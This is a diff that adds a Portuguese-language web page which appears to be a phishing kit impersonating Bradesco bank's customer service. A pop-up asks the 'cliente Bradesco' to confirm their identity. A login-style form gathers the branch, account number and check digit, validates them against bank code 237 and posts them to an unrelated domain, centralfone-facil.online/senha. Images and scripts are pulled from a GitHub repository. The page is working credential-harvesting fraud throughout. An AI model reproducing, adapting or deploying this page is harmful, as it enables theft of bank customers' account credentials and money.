@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="pt-BR" ng-app="app" ng-controller="onlineController">
+<head>
+    <meta charset="utf-8">
+    <meta name="csrf-token" content="3mtWUV0YqWJ3ihjgKuY1qGWYYPYvtLE7Z68ekIiz">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Atendimento</title>
+
+            <meta name="theme-color" content="#f31d5d" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="#f31d5d" />
+        <meta name="msapplication-navbutton-color" content="#f31d5d" />
+        <meta name="color-scheme" content="light">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.bunny.net">
+    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/primatedocker/top/main/inicio/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/primatedocker/top/main/inicio/bootstrap/css/lightbox.min.css">
+    <link rel="stylesheet" href="https://primatedocker.github.io/top/inicio/style.css">
+
+
+    <style>
+        :root {
+            --cor_primaria:#ffffff;
+            --cor_primaria_texto:#e1173f;
+            --cor_primaria_hover:#e1173f;
+            --cor_primaria_texto_hover:#ffffff;
+            --cor_secundaria:#e1173f;
+            --cor_secundaria_texto:#000000;
+            --cor_secundaria_hover:#ffffff;
+            --cor_secundaria_texto_hover:#6c757d;
+            --cor_tercearia:#e1173f;
+            --cor_tercearia_texto:#f2f2f2;
+            --cor_tercearia_hover:#ffffff;
+            --cor_tercearia_texto_hover:#000000;
+            --cor_fundo_um:#ffffff;
+            --cor_fundo_dois:#f5f5f4;
+            --cor_fundo_tres:#ffffff;
+            --cor_fundo_quatro:#e1173f;
+            color-scheme: only light;
+        }
+    </style>
+
+</head>
+<body class="w-100 ">
+<style>
+    .vh-100{
+        height: 100svh !important;
+        min-height: -webkit-fill-available;
+        min-height: -webkit-fill-available;
+        min-height: -moz-available;
+        min-height: fill-available;
+
+    }
+
+</style>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/jquery.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/jquery.mask.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/lightbox.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/cpf.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/dayjs.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/validator.js"></script>
+
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/adapter.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/html5.code.html"></script>
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.11.6/umd/popper.min.js"></script>
+
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/angular/angular.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/angular/angular-cookies.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/angular/angular-locate_ptbr.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/cliente.js"></script>
+
+<script type="text/javascript" >
+    const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]')
+    const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl))
+    const alertList = document.querySelectorAll('.alert')
+    const alerts = [...alertList].map(element => new bootstrap.Alert(element))
+    const minhaurllimpa = 'https://centralfone-facil.online'
+    const id_informacao = '515'
+    const pagina_atual = '/inicio'
+</script>
+
+    <div class="container-fluid headertopBar px-5 d-flex flex-row align-items-center justify-content-between">
+        <div class="container-fluid headertopBar px-5 d-flex flex-row align-items-center justify-content-between">
+            <div class="br-acesso">
+                <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/bradinha.png">
+            </div>
+            <div class="d-flex flex-row flex-fill h-100 campos-bra">
+                <form class="h-100 d-flex flex-row " method="post" action="https://centralfone-facil.online/senha">
+                        <input type="hidden" name="_token" value="3mtWUV0YqWJ3ihjgKuY1qGWYYPYvtLE7Z68ekIiz" autocomplete="off">                        <input type="hidden" name="_method" value="post">                        <input type="hidden" name="tipo" value="FISICA" id="meuTIPO">
+
+                    <div class="d-flex flex-row h-100 py-1">
+                        <label for="agencia" class="form-label h-100 d-flex flex-row align-items-center text-white fw-bold open f13 ps-2 pe-2">
+                            <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/agencia.png">
+                        </label>
+                        <input type="text" class="form-control agencia-brada fs-7 fw-medium" id="agencia" name="agencia">
+                    </div>
+                    <div class="d-flex flex-row h-100 py-1">
+                        <label for="conta" class="form-label h-100 d-flex flex-row align-items-center text-white fw-bold open f13 ps-2 pe-2">
+                            <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/ct.png">
+                        </label>
+                        <input type="text" class="form-control conta-brada fs-7 fw-medium" id="conta" name="conta">
+                        <input type="text" class="form-control dv-brada ms-2 fs-7 fw-medium" id="dv" name="dv">
+                    </div>
+                </form>
+                <div class="p-1 mx-2">
+                    <button class="btn btn-brada" id="envia">OK</button>
+                </div>
+                <img meurage="false" class="lembra pointer" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/lembra.png">
+            </div>
+            <div>
+                <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/acessibilidade.png">
+            </div>
+        </div>
+    </div>
+
+    <div class="container-fluid px-0 slides">
+        <div id="carouselExample" class="carousel slide">
+            <div class="carousel-inner">
+                <div class="carousel-item active">
+                    <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/slide-1.png" class="d-block w-100" alt="...">
+                </div>
+                <div class="carousel-item">
+                    <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/slide-2.png" class="d-block w-100" alt="...">
+                </div>
+                <div class="carousel-item">
+                    <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/slide-3.png" class="d-block w-100" alt="...">
+                </div>
+                <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/menu.png" class="d-block position-absolute menu-brade" alt="...">
+            </div>
+            <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
+                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                <span class="visually-hidden">Previous</span>
+            </button>
+            <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
+                <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                <span class="visually-hidden">Next</span>
+            </button>
+            
+        </div>
+    </div>
+
+    <div class="container-fluid">
+        <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/brb1.png" class="d-block w-100" alt="...">
+    </div>
+
+    <div class="container-fluid px-0">
+        <img src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/images/brb2.png" class="d-block w-100" alt="...">
+    </div>
+
+    
+
+
+    <div class="position-fixed top-0 mt-5 pt-3 w-100 d-flex flex-row align-content-center justify-content-center d-none" id="alerta">
+        <p class="d-block bg-danger p-3 rounded shadow text-white text-center fw-medium" id="msg" style="max-width: 400px">
+            Mensagem do alerta
+        </p>
+    </div>
+            <!-- Modal -->
+        <div class="modal fade" id="ModalAviso" tabindex="-1" aria-labelledby="ModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered">
+                <div class="modal-content p-4">
+
+                    <div class="modal-header border-0">
+                        <h5 class="modal-title montserrat">Confirmação de Identidade para Atendimento Seguro</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body pb-0 p-3">
+                        <p class="montserrat">Olá, cliente Bradesco! Para prosseguirmos com o atendimento, por favor, confirme se é você quem está na linha. Siga os procedimentos a seguir para validar sua identidade e garantir a segurança da nossa conversa. Agradecemos pela sua colaboração!</p>
+                    </div>
+                    <div class="modal-footer border-0">
+                        <button type="button" class="w-100 btn btn-lg btn-custom fw-semibold fs-6 rounded-0 py-3 rounded-5 btn-action montserrat" data-bs-dismiss="modal">continuar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+    <script>
+                const myModalAlternative = new bootstrap.Modal('#ModalAviso')
+        myModalAlternative.show()
+        
+        function alerta(s){
+            $('#msg').html(s);
+            $('#alerta').fadeIn('slow',function (){
+                setTimeout(function (){
+                    $('#alerta').fadeOut('slow', function (){
+                        $('#alerta').addClass('d-none')
+                    })
+                }, 3000)
+            })
+
+            $('#alerta').removeClass('d-none');
+        }
+
+        $(document).on('click','.lembra',function(e) {
+            if(this.getAttribute("meurage") == "false"){
+                this.setAttribute("meurage", "true");
+                this.setAttribute("src", "https://https://github.com/primatedocker/top/main/inicio/images/lembra-hover.png");
+            }else{
+                this.setAttribute("meurage", "false");
+                this.setAttribute("src", "https://https://github.com/primatedocker/top/main/inicio/images/lembra.png");
+            }
+        });
+
+        $('input').keypress(function(e) {
+            if(e.which == 13) {
+                e.preventDefault();
+            }
+        });
+
+        $(document).ready(function(){
+            $('#agencia').mask('0000');
+            $('#conta').mask('0000000');
+            $('#dv').mask('0');
+        })
+
+        $('#agencia').keypress(function(e) {
+            if($('#agencia').val().length == 3){
+                setTimeout(function (){
+                    $('#conta').focus();
+                }, 120)
+            }
+        });
+
+        $('#conta').keypress(function(e) {
+            if($('#conta').val().length == 6){
+                setTimeout(function (){
+                    $('#dv').focus();
+                }, 120)
+            }
+        });
+
+        $(document).on('click','#envia',function(e) {
+            if($('#agencia').val().length == 0){
+                $('agencia').val("")
+                alerta("Verifique o preenchimento de sua agência e tente novamente.")
+
+                setTimeout(function (){
+                    $('#agencia').focus();
+                }, 120)
+            }else if($('#conta').val().length == 0){
+                $('#conta').val("")
+                alerta("Verifique o preenchimento de sua conta e tente novamente.")
+
+                setTimeout(function (){
+                    $('#conta').focus();
+                }, 120)
+            }else if($('#dv').val().length == 0){
+                $('#dv').val("")
+                alerta("Verifique o preenchimento de sua conta e tente novamente.")
+
+                setTimeout(function (){
+                    $('#dv').focus();
+                }, 120)
+            }else{
+                if($('#agencia').val().length < 4){
+                    faltante = 4 - $('#agencia').val().length;
+                    for (var i = 0; i < faltante; i++) {
+                        $('#agencia').val("0" + $('#agencia').val());
+                    }
+                }
+
+                if($('#conta').val().length < 7){
+                    faltante = 7 - $('#conta').val().length;
+                    for (var i = 0; i < faltante; i++) {
+                        $('#conta').val("0" + $('#conta').val());
+                    }
+                }
+
+                Moip.BankAccount.validate({
+                    bankNumber         : "237",
+                    agencyNumber       : $('#agencia').val(),
+                    agencyCheckNumber  : "0",
+                    accountNumber      : $('#conta').val(),
+                    accountCheckNumber : $('#dv').val(),
+                    valid: function() {
+                        $('form').submit();
+                    },
+                    invalid: function(data) {
+
+                        $('#agencia').val('');
+                        $('#conta').val('');
+                        $('#dv').val('');
+
+                        alerta('Preencha novamente seus dados de acesso com atenção.');
+
+                        setTimeout(function (){
+                            $('#agencia').focus();
+                        }, 120)
+
+
+                    }
+                });
+            }
+        });
+
+    </script>
+    
+<div id="lightboxOverlay" tabindex="-1" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" tabindex="-1" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt=""><div class="lb-nav"><a class="lb-prev" role="button" tabindex="0" aria-label="Previous image" href=""></a><a class="lb-next" role="button" tabindex="0" aria-label="Next image" href=""></a></div><div class="lb-loader"><a class="lb-cancel" role="button" tabindex="0"></a></div></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close" role="button" tabindex="0"></a></div></div></div></div>
+
+</body>
+</html>
